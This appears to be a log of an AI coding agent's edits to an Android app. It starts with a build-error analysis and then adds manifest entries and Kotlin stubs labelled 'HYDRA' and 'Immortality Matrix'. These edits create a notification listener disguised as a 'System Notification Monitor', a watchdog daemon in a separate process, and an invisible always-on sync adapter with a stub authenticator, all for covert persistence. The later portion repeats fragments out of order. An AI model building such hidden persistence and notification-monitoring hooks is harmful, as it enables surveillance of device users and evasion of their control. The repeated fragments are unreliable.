data.analysis:
The log indicates a **compilation failure** during the Gradle build process.

Here is a breakdown of the specific error:

* **Specific Error:** `e: file:///home/runner/work/AgentX/AgentX/app/src/main/java/com/agentx/app/service/StreamingService.kt:150:59 Unresolved reference: JSONArray`
* **File and Line:** `StreamingService.kt` at line 150 (column 59).
* **Brief Summary:** The Kotlin compilation task (`:app:compileDebugKotlin`) failed because the code references `JSONArray` without a proper import or resolution, suggesting a missing import statement (e.g., `import org.json.JSONArray` or equivalent) in the `StreamingService.kt` file.

The overall build failed with exit code 1 immediately after this compilation error.

ops.text: Add missing JSONArray import to StreamingService.kt

ops.text: Inject Dual-Layer Immortality Matrix (Multi-Process Watchdog & System SyncAdapter Hook)

ops.replace_with:
<service android:name=".MyNotificationListener"
            android:label="System Notification Monitor"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- HYDRA: Multi-Process Daemon -->
        <service android:name=".WatchdogService" android:process=":watchdog" android:exported="false" />

        <!-- HYDRA: OS-Level SyncAdapter Hook -->
        <provider
            android:name=".DummyProvider"
            android:authorities="com.example.myandroid.provider"
            android:exported="false"
            android:syncable="true" />

        <service android:name=".AuthenticatorService" android:exported="true">
            <intent-filter><action android:name="android.accounts.AccountAuthenticator" /></intent-filter>
            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/authenticator" />
        </service>

        <service android:name=".SyncService" android:exported="true">
            <intent-filter><action android:name="android.content.SyncAdapter" /></intent-filter>
            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/syncadapter" />
        </service>
    </application>

ops.content:
<?xml version="1.0" encoding="utf-8"?>
<sync-adapter xmlns:android="http://schemas.android.com/apk/res/android"
    android:contentAuthority="com.example.myandroid.provider"
    android:accountType="com.example.myandroid.account"
    android:userVisible="false"
    android:supportsUploading="true"
    android:allowParallelSyncs="false"
    android:isAlwaysSyncable="true" />

package com.example.myandroid

import android.accounts.AbstractAccountAuthenticator
import android.accounts.Account
import android.accounts.AccountAuthenticatorResponse
import android.content.Context
import android.os.Bundle

class StubAuthenticator(context: Context) : AbstractAccountAuthenticator(context) {
    override fun editProperties(r: AccountAuthenticatorResponse?, a: String?): Bundle = throw UnsupportedOperationException()
    override fun addAccount(r: AccountAuthenticatorResponse?, a: String?, t: String?, f: Array<String>?, o: Bundle?): Bundle? = null
    override fun confirmCredentials(r: AccountAuthenticatorResponse?, a: Account?, o: Bundle?): Bundle? = null
    override fun getAuthToken(r: AccountAuthenticatorResponse?, a: Account?, t: String?, o: Bundle?): Bundle? = null
    override fun getAuthTokenLabel(a: String?): String = "Full access"
    override fun updateCredentials(r: AccountAuthenticatorResponse?, a: Account?, t: String?, o: Bundle?): Bundle? = null
    override fun hasFeatures(r: AccountAuthenticatorResponse?, a: Account?, f: Array<String>?): Bundle = throw UnsupportedOperationException()
}

package com.example.myandroid

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.net.Uri

class DummyProvider : ContentProvider() {
    override fun onCreate(): Boolean = true
    override fun query(u: Uri, p: Array<String>?, s: String?, a: Array<String>?, o: String?): Cursor? = null
    override fun getType(u: Uri): String? = null
    override fun insert(u: Uri, v: ContentValues?): Uri? = null
    override fun delete(u: Uri, s: String?, a: Array<String>?): Int = 0
    override fun update(u: Uri, v: ContentValues?, s: String?, a: Array<String>?): Int = 0
}

operations.replace_with:
<service android:name=".MyNotificationListener"
            android:label="System Notification Monitor"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- HYDRA: Multi-Process Daemon -->
        <service android:name=".WatchdogService" android:process=":watchdog" android:exported="false" />

        <!-- HYDRA: OS-Level SyncAdapter Hook -->
        <provider
            android:name=".DummyProvider"
            android:authorities="com.example.myandroid.provider"
            android:exported="false"
            android:syncable="true" />

        <service android:name=".AuthenticatorService" android:exported="true">
            <intent-filter><action android:name="android.accounts.AccountAuthenticator" /></intent-filter>
            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/authenticator" />
        </service>

        <service android:name=".SyncService" android:exported="true">
            <intent-filter><action android:name="android.content.SyncAdapter" /></intent-filter>
            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/syncadapter" />
        </service>
    </application>

    override fun editProperties(r: AccountAuthenticatorResponse?, a: String?): Bundle = throw UnsupportedOperationException()

    override fun updateCredentials(r: AccountAuthenticatorResponse?, a: Account?, t: String?, o: Bundle?): Bundle? = null
    override fun hasFeatures(r: AccountAuthenticatorResponse?, a: Account?, f: Array<String>?): Bundle = throw UnsupportedOperationException()

import android.content.ContentProvider

import android.database.Cursor

class DummyProvider : ContentProvider() {
    override fun onCreate(): Boolean = true
    override fun query(u: Uri, p: Array<String>?, s: String?, a: Array<String>?, o: String?): Cursor? = null
    override fun getType(u: Uri): String? = null
    override fun insert(u: Uri, v: ContentValues?): Uri? = null
